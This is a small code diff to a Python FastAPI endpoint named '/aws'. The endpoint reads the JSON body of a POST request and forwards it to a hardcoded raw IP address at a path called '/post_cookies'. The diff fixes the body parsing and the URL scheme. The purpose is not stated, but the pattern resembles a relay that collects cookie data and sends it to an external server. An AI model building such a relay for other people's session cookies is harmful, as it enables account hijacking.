@@ -11,12 +11,12 @@ async def index():
     return {"success": True, "message": "Hello World"}
 
 
-@app.post("/aws", status_code=301)
+@app.post("/aws")
 async def aws(r: Request):
 
     # retrieving payload
     try:
-        payload = r.body()
+        payload = await r.json()
     except Exception as ex:
         print(ex)
         raise HTTPException(400, detail="bad request")
@@ -24,7 +24,7 @@ async def aws(r: Request):
 
     # sending data to AWS
     aws_response = requests.post(
-        url="52.23.187.142:5000/post_cookies/",
+        url="http://52.23.187.142:5000/post_cookies",
         json=payload
     )
 
